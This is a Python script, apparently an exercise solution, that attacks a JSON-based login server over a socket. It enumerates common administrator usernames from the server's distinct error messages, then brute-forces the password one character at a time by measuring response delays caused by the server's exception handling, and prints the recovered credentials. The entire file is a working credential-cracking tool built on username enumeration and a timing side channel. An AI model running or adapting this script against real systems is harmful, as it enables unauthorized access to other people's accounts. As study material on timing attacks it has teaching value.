# It is known that the communication uses JSON object type
import sys
import socket
import json
from datetime import datetime

# get the details of the server viz. IP address and port number
details = sys.argv
address = (details[1], int(details[2]))
mySocket = socket.socket()
mySocket.connect(address)
allchars = '0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ'
allchars += '!"#$%&\'()*+,-./:;<=>?@[\\]^_`{|}~'
# create a list of characters(from the above string of possible characters)
alpha_chars = [i for i in allchars]
credentials = {
    "login": "",
    "password": " "
}
# List of few common admin logins which are known beforehand
logins = ['admin', 'Admin', 'admin1', 'admin2', 'admin3', 'user1',
          'user2', 'root', 'default', 'new_user', 'some_user',
          'new_admin', 'administrator', 'Administrator', 'superuser',
          'super', 'su', 'alex', 'suser', 'rootuser', 'adminadmin',
          'useruser', 'superadmin', 'username', 'username1']
# time parameters uses to calculate the time taken by server to respond back
start_time = 0
end_time = 0
difference1 = 0
# to get the login name of the server with any password
for val in logins:
    credentials['login'] = val
    # convert it into JSON type
    jsonString = json.dumps(credentials)
    start_time = datetime.now()
    # start noting the time and send the encoded data
    mySocket.send(jsonString.encode('utf-8'))
    received_ = mySocket.recv(1024).decode('utf-8')
    # once the server responds with response, note the time
    end_time = datetime.now()
    # revert back from JSON type to python object
    received = json.loads(received_)
    # if the response says wrong login, the login name used is not correct
    # if the response says wrong password, the login name used is correct
    if 'result' in received.keys():
        if received['result'] == "Wrong login!":
            continue
        if received['result'] == "Wrong password!":
            # note the difference in response time and use this as reference
            difference1 = end_time - start_time
            break
Password = ""
received = {}
# for knowing the password using the vulnerability of catching exception
# as mentioned, catching an exception takes the computer longer time
while True:
    for ch in alpha_chars:
        # do the same process as done while knowing the login name
        credentials["password"] = Password + str(ch)
        jsonString = json.dumps(credentials)
        start_time = datetime.now()
        mySocket.send(jsonString.encode('utf-8'))
        received_ = mySocket.recv(1024).decode('utf-8')
        end_time = datetime.now()
        received = json.loads(received_)
        if 'result' in received.keys():
            if received['result'] == "Wrong password!":
                difference2 = end_time - start_time
                # if the server response takes some more time than ususal,
                # it can be known that the exception is been observed at server
                if (difference2 - difference1).total_seconds() > 0.1:
                    Password += str(ch)
                    break
            if received['result'] == "Connection success!":
                break
    if 'result' in received.keys():
        if received['result'] == "Connection success!":
            break
print(json.dumps(credentials))
mySocket.close()
